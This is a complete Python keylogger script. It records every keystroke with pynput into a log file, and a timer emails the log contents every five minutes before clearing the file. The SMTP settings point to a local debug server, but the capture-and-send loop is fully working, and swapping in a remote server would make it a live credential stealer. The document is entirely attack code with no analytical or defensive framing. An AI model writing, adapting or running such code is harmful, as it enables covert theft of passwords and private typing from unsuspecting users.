import threading
import smtplib
from pynput import keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os

LOG_FILE = "log.txt"

# Ensure the log file exists before use
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        pass  # creates an empty file

# Local debug SMTP settings
SMTP_SERVER = "localhost"
SMTP_PORT = 1025

def send_email():
    with open(LOG_FILE, "r") as log_file:
        log_content = log_file.read()

    msg = MIMEMultipart()
    msg["From"] = "test@localhost"
    msg["To"] = "receiver@localhost"
    msg["Subject"] = "Keylogger Log Update"
    msg.attach(MIMEText(log_content, "plain"))

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.send_message(msg)

    print("[DEBUG] Email sent to local debug SMTP server.")

    # Clear the log file after sending
    open(LOG_FILE, "w").close()

def periodic_email():
    send_email()
    threading.Timer(300, periodic_email).start()  # every 5 min

def on_press(key):
    with open(LOG_FILE, "a") as log_file:
        try:
            log_file.write(f"{key.char}")
        except AttributeError:
            log_file.write(f"[{key}]")

if __name__ == "__main__":
    periodic_email()  # Start periodic email sending
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
